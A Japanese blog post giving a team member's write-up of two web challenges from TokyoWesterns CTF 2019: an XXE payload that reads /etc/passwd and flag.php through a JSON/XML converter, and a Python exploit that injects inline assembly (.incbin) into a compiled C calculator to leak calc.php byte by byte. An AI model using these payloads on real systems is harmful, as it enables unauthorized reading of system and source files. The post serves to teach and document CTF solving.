---
layout: post
title: TokyoWesterns CTF 5th 2019 の write-up
categories: [ctf]
date: 2019-09-14 05:00:00 +0900
---

8 月 31 日から 9 月 2 日にかけて開催された [TokyoWesterns CTF 5th 2019](https://ctf.westerns.tokyo) に、チーム Harekaze (今回は Harekaze と zer0pts との合同チーム) として参加しました。最終的にチームで 1481 点を獲得し、順位は得点 1005 チーム中 33 位でした。うち、私は 1 問を解いて 59 点を入れました。

他のメンバーの write-up はこちら。

- [TokyoWesterns CTF 5th 2019 Writeup - CTFするぞ](https://ptr-yudai.hatenablog.com/entry/2019/09/02/100556)
- [writeups/twctf/2019 at master · hnoson/writeups](https://github.com/hnoson/writeups/tree/master/twctf/2019)

以下、私が解いた問題の writeup です。

## 競技時間中に解けた問題
### j2x2j (Web 59)
> ここに便利なツールを用意しました。

与えられた URL にアクセスすると、以下のようなフォームが返ってきました。

```html
<!doctype html>
<html>
  <head>
    <title>JSON <-> XML Converter</title>
  </head>
  <body>
    <textarea id="json" name="json" rows="50" cols="80">
    </textarea>

    <input type="button" id="x2j" value="<-"/>
    <input type="button" id="j2x" value="->"/>

    <textarea id="xml" name="xml" rows="50" cols="80">
    </textarea>

    <script
      src="https://code.jquery.com/jquery-3.2.1.min.js"
      integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
      crossorigin="anonymous"></script>
    <script>
      $.get('/sample.json', function(data) {
        $('#json').val(data);
      }, 'text');

      $('#j2x').on('click', function() {
        $.post('/', {
          json: $('#json').val()
        }, function(data) {
          $('#xml').val(data);
        });
      });

      $('#x2j').on('click', function() {
        $.post('/', {
          xml: $('#xml').val()
        }, function(data) {
          $('#json').val(data);
        });
      });
    </script>
  </body>
</html>
```

JSON と XML を相互に変換してくれる Web アプリケーションのようです。XML と聞いて思い出すのは XXE (XML External Entity) を使った攻撃です。[XXE攻撃 基本編 \| MBSD Blog](https://www.mbsd.jp/blog/20171130.html) を参考に適当なファイルを読んでみましょう。

以下のような XML を用意します。

```xml
<?xml version="1.0"?>
<!DOCTYPE name [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <neko>&xxe;</neko>
</root>
```

JSON から XML への変換ボタンを押すと、以下のような JSON が返ってきました。

```json
{
    "neko": "root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/var\/run\/ircd:\/usr\/sbin\/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:\/run\/systemd\/netif:\/usr\/sbin\/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:\/run\/systemd\/resolve:\/usr\/sbin\/nologin\nsyslog:x:102:106::\/home\/syslog:\/usr\/sbin\/nologin\nmessagebus:x:103:107::\/nonexistent:\/usr\/sbin\/nologin\n_apt:x:104:65534::\/nonexistent:\/usr\/sbin\/nologin\nlxd:x:105:65534::\/var\/lib\/lxd\/:\/bin\/false\nuuidd:x:106:110::\/run\/uuidd:\/usr\/sbin\/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:\/var\/lib\/misc:\/usr\/sbin\/nologin\nlandscape:x:108:112::\/var\/lib\/landscape:\/usr\/sbin\/nologin\nsshd:x:109:65534::\/run\/sshd:\/usr\/sbin\/nologin\npollinate:x:110:1::\/var\/cache\/pollinate:\/bin\/false\n_chrony:x:111:115:Chrony daemon,,,:\/var\/lib\/chrony:\/usr\/sbin\/nologin\nubuntu:x:1000:1000:Ubuntu:\/home\/ubuntu:\/bin\/bash\ntw:x:1001:1002::\/home\/tw:\/bin\/bash\ngoogle-fluentd:x:112:116::\/home\/google-fluentd:\/usr\/sbin\/nologin\n"
}
```

`/etc/passwd` が読めました。フラグの場所がわかりませんが、`http://(省略)/flag.php` が 200 を返したのでこのファイルを読めばよいのでしょう。`file:///etc/passwd` を `php://filter/convert.base64-encode/resource=flag.php` に変えてもう一度 JSON から XML への変換ボタンを押すと、以下のような JSON が返ってきました。

```json
{
    "neko": "PD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsK"
}
```

これを Base64 デコードするとフラグが得られました。

```
TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}
```

## 競技終了後に解いた問題
### Oneline Calc - Flag 1 (Web 314)
> 全く新しい電卓がここに！！！
> 
> 注意事項
> - 一分おきにユーザのデータを削除しています
> - 1バイトずつ情報をリークする必要はありません。一度にデータを得る方法があります。
> - [09/01 11:55 JST] calc.php のソースコードに不具合があったため、修正しました。
> - flag1は calc.php の中にあります
> - 同じIPからのリクエストを10回/秒に制限しました。アナウンスしたとおり、1 byteずつリークする必要はありません。

与えられた URL にアクセスすると、以下のようなフォームが返ってきました。

```html
<!doctype html>
<html>
    <head>
        <title>Oneline Calculator</title>
    </head>
    <body>
        <input type="text" id="formula" placeholder="formula" value="114 + 514">
        % 256
        <button id="button">=</button>
        <input type="text" id="result" disabled>
        <script>
            document.querySelector('#button').addEventListener('click', (e) => {
                const input = document.querySelector('#formula')
                const result = document.querySelector('#result')
                input.disabled = true
                const es = new EventSource(`/calc.php?formula=${encodeURIComponent(input.value)}`);
                es.addEventListener('message', (e) => {
                    result.value = e.data
                })
                es.addEventListener('error', (e) => {
                    result.value = e.data
                    input.disabled = false
                })
                es.addEventListener('close', (e) => {
                    es.close()
                    input.disabled = false
                })
            })
        </script>
    </body>
</html>
```

`formula` に入力した計算式の答えを (`% 256` した上で) 返してくれる Web アプリケーションのようです。`#` `{` `}` や改行文字を入力すると数式のパースの前に弾かれる、`-1` を入力すると `255` が返ってくる (PHP では `-1 % 256 === -1`) 等、不思議な挙動をしていたことから色々試していると、`sizeof(int)` を入力したときに `4` を返したことから、C のコードにユーザ入力を挿入した上でコンパイルし、実行した結果を PHP 側が何らかの形で取得し出力していると推測しました。

どのように PHP 側で実行結果を取得しているか調べると、`1; int a;` が通って `1; int res;` が通らず、また `1; exit(2); res = 3;` の実行結果が `2` になることから、以下のような C コードをコンパイルして実行し、その終了コードを実行結果としていると推測しました。

```c
/* いろいろ */
int main() {
  int res = /* ここにユーザ入力が入る */;
  return res;
}
```

また、`__GCC_IEC_559_COMPLEX` 等を入力しても数式のパースに失敗しない (= コンパイルに失敗しない) ことから、コンパイルには GCC が使われていると推測しました。

これを利用して `/srv/olc/public/calc.php` を読めばよいのかと思ったのですが、`1; FILE *fp; fp = fopen("/etc/passwd", "r"); return fp` は 0 以外の値を返すものの、`1; FILE *fp; fp = fopen("/srv/olc/public/calc.php", "r"); return fp` は 0 (= `NULL`) を返します。ファイルを開くのに失敗しているようです。

Web サーバとは別の環境で実行しているのではないかと考えましたが、`access` 関数で `/srv/olc/public/calc.php` を `F_OK` と `R_OK` でそれぞれ確認したところ、ファイルは存在しているものの読み取り権限がないことがわかりました。`__FILE__` でも同じような挙動を示すことから、コンパイル時には読み取り権限があるものの、実行時には権限が落とされているのではないか (= コンパイル時にファイルを読む必要がある) のではないかと推測しました。

コンパイル時のファイル読み込みと聞いてまず思い浮かぶのは `#include` ですが、`/srv/olc/public/calc.php` の内容を `#include` で文字列として埋め込むのは厳しそうです。また、`#` の制限はダイグラフ (`%:` がコンパイル時 `#` に変換される) で回避できますが、改行文字は CR と LF が使えない以上 (たぶん) どうしようもありません。

---

ここまでが競技時間中に考えた/わかったことです。競技終了後に gas の機能である `.incbin` を使えばよいと知って書いた exploit が以下です。

```python
import re
import requests
from urllib.parse import quote

code = '''
1;
asm goto (""::::a);
goto b;

a: asm(".incbin \\"/srv/olc/public/calc.php\\"");
b: return ((char *)&&a)[{}];
'''.replace('\n', ' ')

res = ''
i = len(res)
while True:
  r = requests.get('http://(省略)/calc.php?formula=' + quote(code.format(i)))
  r = r.content.decode()
  c = int(re.findall(r'data: evaluating\n\n\nevent: message\ndata: (.+)\n', r)[0])
  res += chr(c)
  i += 1
  print(res)
```

```
$ python solve.py
︙
<?php
// TWCTF{1nsecure_c0mpiling_with_C_78024f34fd92e04734533a7e174807da}
/*
Notification for flag2
- `/var/tmp` is the place for you to store some data where cannot be listed by others.
- execute `/readflag2` to get flag (/flag2).
*/
︙
```